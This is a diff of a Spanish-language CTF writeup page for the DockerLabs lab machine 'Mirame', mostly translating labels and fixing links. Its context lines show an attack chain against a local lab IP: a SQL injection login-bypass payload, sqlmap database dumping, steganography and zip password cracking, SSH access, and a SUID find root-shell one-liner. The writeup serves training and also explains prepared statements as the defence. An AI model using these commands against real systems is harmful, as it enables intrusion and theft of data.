@@ -104,7 +104,7 @@
     .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
     .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
     .badge-facil   { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
-    .badge-dl      { color: var(--cyan);  border-color: rgba(0,229,255,0.3);  background: rgba(0,229,255,0.05); }
+    .badge-docker      { color: var(--cyan);  border-color: rgba(0,229,255,0.3);  background: rgba(0,229,255,0.05); }
     .badge-linux   { color: var(--yellow); border-color: rgba(255,215,0,0.3);  background: rgba(255,215,0,0.05); }
     .badge-sqli    { color: var(--red);    border-color: rgba(255,45,85,0.4);   background: rgba(255,45,85,0.05); }
     .badge-steg    { color: var(--purple); border-color: rgba(191,95,255,0.35); background: rgba(191,95,255,0.05); }
@@ -139,7 +139,7 @@
     .val-red    { color: var(--red); }
     .val-facil  { color: #00ffcc; }
 
-    /* ATTACK PATH */
+    /* RUTA DE ATAQUE */
     .attack-path { display: flex; flex-direction: column; gap: 0; }
     .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
     .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
@@ -316,31 +316,32 @@
 <div class="cursor-ring" id="cursorRing"></div>
 
 <nav>
-  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
-  <a href="https://brandeiks.github.io/writeups/" class="nav-back">volver al portafolio</a>
-</nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <a href="../../../writeups/index.html" class="nav-back">ANÁLISIS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+  </nav>
 
 <!-- HERO -->
 <div class="writeup-hero">
   <div class="hero-grid"></div>
   <div class="hero-glow"></div>
   <div class="writeup-hero-content">
-    <p class="breadcrumb">
-      <a href="https://brandeiks.github.io/">brandeiks</a> /
-      <a href="https://brandeiks.github.io/writeups/">writeups</a> /
-      <a href="https://brandeiks.github.io/writeups/">dockerlabs</a> /
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">análisis</a> /
+      <a href="../../../writeups/index.html">dockerlabs</a> /
       <span>mirame</span>
-    </p>
+    </div>
     <h1 class="writeup-title"><span style="color:var(--green)">Mirame</span></h1>
-    <p class="writeup-subtitle">DockerLabs — Linux · SQLi Bypass → sqlmap DB dump → Esteganografía → SSH → SUID find LPE</p>
+    <p class="writeup-subtitle">DockerLabs — Linux · Bypass de SQLi → Volcado de base de datos con sqlmap → Esteganografía → SSH → LPE con SUID find</p>
     <div class="writeup-meta">
       <span class="meta-badge badge-facil">● FÁCIL</span>
-      <span class="meta-badge badge-dl">DOCKERLABS</span>
+      <span class="meta-badge badge-docker">DOCKERLABS</span>
       <span class="meta-badge badge-linux">LINUX</span>
       <span class="meta-badge badge-sqli">SQL INJECTION</span>
       <span class="meta-badge badge-steg">ESTEGANOGRAFÍA</span>
       <span class="meta-badge badge-suid">SUID · LPE</span>
-      <span class="meta-date">📅 Mayo 2026 · By Brandeiks</span>
+      <span class="meta-date">📅 Mayo 2026 · Por Brandeiks</span>
     </div>
   </div>
 </div>
@@ -357,7 +358,7 @@
         <li><a href="#despliegue">02 · Despliegue</a></li>
         <li><a href="#reconocimiento">03 · Reconocimiento</a></li>
         <li><a href="#enumeracion">04 · Enumeración Web</a></li>
-        <li><a href="#sqli">05 · SQL Injection</a></li>
+        <li><a href="#sqli">05 · Inyección SQL</a></li>
         <li><a href="#sqlmap">06 · sqlmap &amp; DB dump</a></li>
         <li><a href="#esteganografia">07 · Esteganografía</a></li>
         <li><a href="#acceso">08 · Acceso SSH</a></li>
@@ -371,7 +372,7 @@
       <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-cyan">DockerLabs</span></div>
       <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux (Debian)</span></div>
       <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-facil">Fácil</span></div>
-      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">172.17.0.2</span></div>
+      <div class="info-row"><span class="info-label">IP objetivo</span><span class="info-val" style="color:var(--text)">172.17.0.2</span></div>
       <div class="info-row"><span class="info-label">DBMS</span><span class="info-val val-red">MariaDB (MySQL)</span></div>
       <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
     </div>
@@ -470,7 +471,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo bash auto_deploy.sh mirame.tar">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">DEPLOY</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo bash <span class="arg">auto_deploy.sh</span> <span class="arg">mirame.tar</span></span></div>
       </div>
@@ -522,7 +523,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 172.17.0.2 -oX mirame.xml">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">NMAP</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p- -sSCV -n -Pn</span> <span class="flag">--min-rate=5000 --open</span> <span class="arg">172.17.0.2</span> <span class="flag">-oX</span> <span class="arg">mirame.xml</span></span></div>
       </div>
@@ -569,7 +570,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl mirame.xml > mirame.html">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">XSLTPROC</span>
         <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">mirame.xml</span> &gt; <span class="arg">mirame.html</span></span></div>
       </div>
@@ -611,7 +612,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x txt,php,bak,old">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">GOBUSTER</span>
         <div><span class="prompt">$ </span><span class="cmd">gobuster <span class="flag">dir</span> <span class="flag">-u</span> <span class="arg">http://172.17.0.2</span> <span class="flag">-w</span> <span class="arg">/usr/share/wordlists/dirb/common.txt</span> <span class="flag">-x</span> <span class="arg">txt,php,bak,old</span></span></div>
       </div>
@@ -645,7 +646,7 @@
     <!-- SQL INJECTION MANUAL -->
     <div class="section" id="sqli">
       <p class="section-label">// 05</p>
-      <h2 class="section-title">SQL Injection — Detección Manual</h2>
+      <h2 class="section-title">Inyección SQL — Detección Manual</h2>
       <div class="section-line"></div>
 
       <div class="prose">
@@ -687,7 +688,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="'admin' --'">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">LOGIN FIELD → USUARIO</span>
         <div><span class="prompt">usuario &gt; </span><span class="cmd"><span class="arg">'admin' --'</span></span></div>
         <div><span class="prompt">password &gt; </span><span class="cmd"><span class="arg">cualquiercosa</span></span></div>
@@ -706,7 +707,7 @@
 
       <div class="sqli-box">
         <p class="sqli-box-title">// ¿POR QUÉ ESTO CONFIRMA LA VULNERABILIDAD?</p>
-        <p>Un formulario <strong>seguro</strong> usaría <em>prepared statements</em> o escapado de caracteres especiales. En ese caso, el apóstrofe sería tratado como texto literal y no rompería la query. Aquí, el servidor ejecutó el input directamente dentro de la query SQL sin ningún filtro, y encima devolvió el error completo con rutas del servidor — dos fallos críticos en uno: <strong>SQL Injection</strong> + <strong>error verbose</strong>.</p>
+        <p>Un formulario <strong>seguro</strong> usaría <em>prepared statements</em> o escapado de caracteres especiales. En ese caso, el apóstrofe sería tratado como texto literal y no rompería la query. Aquí, el servidor ejecutó el input directamente dentro de la query SQL sin ningún filtro, y encima devolvió el error completo con rutas del servidor — dos fallos críticos en uno: <strong>Inyección SQL</strong> + <strong>error verbose</strong>.</p>
       </div>
     </div>
 
@@ -720,7 +721,7 @@
 
       <div class="prose">
         <p>
-          Confirmada la vulnerabilidad SQL Injection, se automatiza la extracción usando
+          Confirmada la vulnerabilidad Inyección SQL, se automatiza la extracción usando
           <strong>sqlmap</strong> — la herramienta estándar del sector para pruebas de
           inyección SQL. Antes de ejecutarla, necesitamos capturar el request HTTP completo
           del formulario de login para que sqlmap sepa exactamente qué enviar al servidor.
@@ -781,7 +782,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sqlmap -r request.txt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SQLMAP</span>
         <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span></span></div>
       </div>
@@ -814,7 +815,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sqlmap -r request.txt --dbs">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SQLMAP · DBS</span>
         <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">--dbs</span></span></div>
       </div>
@@ -841,7 +842,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sqlmap -r request.txt -D users --tables">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SQLMAP · TABLES</span>
         <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">-D</span> <span class="arg">users</span> <span class="flag">--tables</span></span></div>
       </div>
@@ -872,7 +873,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sqlmap -r request.txt -D users -T usuarios --dump">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SQLMAP · DUMP</span>
         <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">-D</span> <span class="arg">users</span> <span class="flag">-T</span> <span class="arg">usuarios</span> <span class="flag">--dump</span></span></div>
       </div>
@@ -934,7 +935,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="gobuster dir -u http://172.17.0.2 -w /home/kali/Desktop/HXPLOIT/4.ciclo/semana_5/mirame/pasword.txt -x txt,php,bak,old">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">GOBUSTER · CUSTOM WORDLIST</span>
         <div><span class="prompt">$ </span><span class="cmd">gobuster <span class="flag">dir</span> <span class="flag">-u</span> <span class="arg">http://172.17.0.2</span> <span class="flag">-w</span> <span class="arg">pasword.txt</span> <span class="flag">-x</span> <span class="arg">txt,php,bak,old</span></span></div>
       </div>
@@ -968,7 +969,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="wget http://172.17.0.2/directoriotravieso/miramebien.jpg">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">WGET</span>
         <div><span class="prompt">$ </span><span class="cmd">wget <span class="arg">http://172.17.0.2/directoriotravieso/miramebien.jpg</span></span></div>
       </div>
@@ -996,7 +997,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="stegseek miramebien.jpg">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">STEGSEEK</span>
         <div><span class="prompt">$ </span><span class="cmd">stegseek <span class="arg">miramebien.jpg</span></span></div>
       </div>
@@ -1035,7 +1036,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="zip2john miramebien.jpg.out > hash_mirabien.txt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">ZIP2JOHN</span>
         <div><span class="prompt">$ </span><span class="cmd">zip2john <span class="arg">miramebien.jpg.out</span> &gt; <span class="arg">hash_mirabien.txt</span></span></div>
       </div>
@@ -1063,7 +1064,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="john --wordlist=/usr/share/wordlists/rockyou.txt hash_mirabien.txt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">JOHN</span>
         <div><span class="prompt">$ </span><span class="cmd">john <span class="flag">--wordlist=</span><span class="arg">/usr/share/wordlists/rockyou.txt</span> <span class="arg">hash_mirabien.txt</span></span></div>
       </div>
@@ -1089,7 +1090,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="john --show hash_mirabien.txt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">JOHN · SHOW</span>
         <div><span class="prompt">$ </span><span class="cmd">john <span class="flag">--show</span> <span class="arg">hash_mirabien.txt</span></span></div>
       </div>
@@ -1119,7 +1120,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="unzip miramebien.jpg.out">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">UNZIP</span>
         <div><span class="prompt">$ </span><span class="cmd">unzip <span class="arg">miramebien.jpg.out</span></span></div>
       </div>
@@ -1146,7 +1147,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="cat secret.txt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">CAT</span>
         <div><span class="prompt">$ </span><span class="cmd">cat <span class="arg">secret.txt</span></span></div>
       </div>
@@ -1193,7 +1194,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ssh carlos@172.17.0.2">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SSH</span>
         <div><span class="prompt">$ </span><span class="cmd">ssh <span class="arg">carlos</span>@<span class="arg">172.17.0.2</span></span></div>
       </div>
@@ -1219,7 +1220,7 @@
     <!-- PRIVESC -->
     <div class="section" id="privesc">
       <p class="section-label">// 09</p>
-      <h2 class="section-title">Escalada de Privilegios — SUID en /usr/bin/find</h2>
+      <h2 class="section-title">Escalada de privilegios — SUID en /usr/bin/find</h2>
       <div class="section-line"></div>
 
       <div class="prose">
@@ -1257,7 +1258,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="find / -perm -4000 2>/dev/null">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SUID SEARCH</span>
         <div><span class="prompt">$ </span><span class="cmd">find <span class="arg">/</span> <span class="flag">-perm -4000</span> <span class="arg">2&gt;/dev/null</span></span></div>
       </div>
@@ -1321,7 +1322,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="/usr/bin/find . -exec /bin/sh -p \; -quit">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PRIVESC · SUID FIND</span>
         <div><span class="prompt">$ </span><span class="cmd">/usr/bin/find <span class="flag">.</span> <span class="flag">-exec</span> <span class="arg">/bin/sh -p</span> <span class="flag">\;</span> <span class="flag">-quit</span></span></div>
         <div><span class="prompt-root"># </span><span class="cmd">whoami</span></div>
@@ -1392,7 +1393,7 @@
         <div class="cmd-ref-card">
           <div class="cmd-ref-name">sqlmap</div>
           <div class="cmd-ref-syntax">sqlmap -r &lt;request.txt&gt; [--dbs] [-D db] [--tables] [-T tabla] [--dump]</div>
-          <div class="cmd-ref-desc">Herramienta automatizada de detección y explotación de SQL Injection. Prueba múltiples técnicas (boolean-based, error-based, time-based, union-based) y puede extraer toda la estructura y datos de la base de datos.</div>
+          <div class="cmd-ref-desc">Herramienta automatizada de detección y explotación de Inyección SQL. Prueba múltiples técnicas (boolean-based, error-based, time-based, union-based) y puede extraer toda la estructura y datos de la base de datos.</div>
           <ul class="cmd-ref-flags">
             <li><span>-r request.txt</span> — Lee el request HTTP desde un archivo (capturado con Burp)</li>
             <li><span>--dbs</span> — Enumera todas las bases de datos disponibles</li>
@@ -1465,13 +1466,13 @@
       <div class="glosario-grid">
 
         <div class="glos-card">
-          <div class="glos-term">SQL Injection (SQLi)</div>
+          <div class="glos-term">Inyección SQL (SQLi)</div>
           <div class="glos-def">La <strong>inyección SQL</strong> es una vulnerabilidad web que permite a un atacante interferir en las consultas que una aplicación hace a su base de datos. Ocurre cuando la aplicación construye queries SQL concatenando directamente el input del usuario sin sanitizarlo. El atacante introduce caracteres especiales como <code>'</code>, <code>--</code>, <code>;</code> o <code>OR 1=1</code> que cambian la lógica de la query original. Las consecuencias van desde bypass de autenticación hasta extracción completa de la base de datos o ejecución de comandos en el sistema operativo.</div>
         </div>
 
         <div class="glos-card">
           <div class="glos-term">Prepared Statements — Prevención de SQLi</div>
-          <div class="glos-def">Los <strong>prepared statements</strong> (sentencias preparadas) son la contramedida principal contra SQL Injection. En lugar de construir la query concatenando strings, se define la query con parámetros placeholder (<code>?</code> o <code>:nombre</code>) y se envían los valores por separado. La base de datos los trata siempre como datos literales, nunca como código SQL, haciendo imposible que un apóstrofe en el input rompa la query. En PHP se usan con <code>mysqli_prepare()</code> o PDO.</div>
+          <div class="glos-def">Los <strong>prepared statements</strong> (sentencias preparadas) son la contramedida principal contra Inyección SQL. En lugar de construir la query concatenando strings, se define la query con parámetros placeholder (<code>?</code> o <code>:nombre</code>) y se envían los valores por separado. La base de datos los trata siempre como datos literales, nunca como código SQL, haciendo imposible que un apóstrofe en el input rompa la query. En PHP se usan con <code>mysqli_prepare()</code> o PDO.</div>
         </div>
 
         <div class="glos-card">
@@ -1520,7 +1521,7 @@
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">Escalada de Privilegios Local (LPE)</div>
+          <div class="glos-term">Escalada de privilegios Local (LPE)</div>
           <div class="glos-def">La <strong>escalada de privilegios local</strong> es el proceso por el cual un usuario con acceso limitado al sistema obtiene permisos de superusuario (root). En Linux, los vectores más comunes son: <strong>SUID mal configurados</strong> (binarios que ejecutan código arbitrario como root), <strong>sudo mal configurado</strong> (el usuario puede ejecutar ciertos comandos como root sin contraseña), <strong>cron jobs</strong> (tareas programadas que ejecutan scripts modificables por el usuario), <strong>vulnerabilidades del kernel</strong>, y <strong>credenciales mal almacenadas</strong>. En esta máquina, el vector es un binario SUID (<code>find</code>).</div>
         </div>
 
@@ -1537,9 +1538,9 @@
 
 <!-- FOOTER -->
 <footer>
-  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · DockerLabs</p>
-  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
-</footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Análisis de Mirame · DockerLabs</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
 
 <script>
   // ACTIVE TOC
